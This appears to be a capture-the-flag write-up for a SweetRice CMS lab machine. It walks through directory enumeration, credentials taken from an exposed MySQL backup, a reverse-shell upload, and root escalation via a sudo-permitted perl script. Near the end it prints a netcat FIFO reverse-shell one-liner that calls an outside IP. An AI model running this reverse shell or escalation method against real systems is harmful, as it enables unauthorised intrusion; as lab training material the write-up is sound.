At first of course nmap scan which is giving us only 2 open ports, nothing interesting, there's only ssh and web server running on machine.
We also run a gobuster scan, its importan, even more than nmap because this attack is more geared towards exploring sensitive libraries which shoud not been public. 

From gobuster I know there is dir called content, which is kind a informing page from web aplication.
App is called "Sweetrice" and its CMS. This one is new to me, I don't have experience with it. I searched exploit for this ap but its only for older versions. 
"Content" dir has link for technical help for admins, many usefull informations about security which we can leverage, for example we know that every importan file is stored in "inc" dir.
I know content is dir because I noticed here is slash at the end so lets run gobuster again. It was good idea because we forced another dir called "as", which is login page.
I decided to go through "inc" dir, and there is nothing that could be more sensitive, because we discovered MySQL backups.
We can just open this file in text editor and I got credentials for manager account for "as" dir. I cracked hash, uploaded a reverse shell on website and got shell.



// PRIV ESC PART //
I spawned a shell via python: python -c 'import pty;pty.spawn("bin/bash")' 

One of the easiest ways to find potential privelage escalation methods is sudo -l. 
Output:
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
    
Luckily we got some prics and we can run some script as root in /home/itguy. I checked this script to know what what is he doing. Output:
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

Ok, so this script is very short because its only one line of code and this one runs another script, located in /etc/.

Output of script located in /etc:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

Its just reverse shell mini script using netcat, so we just change this ip and port, run our nc listener and we got root shell.
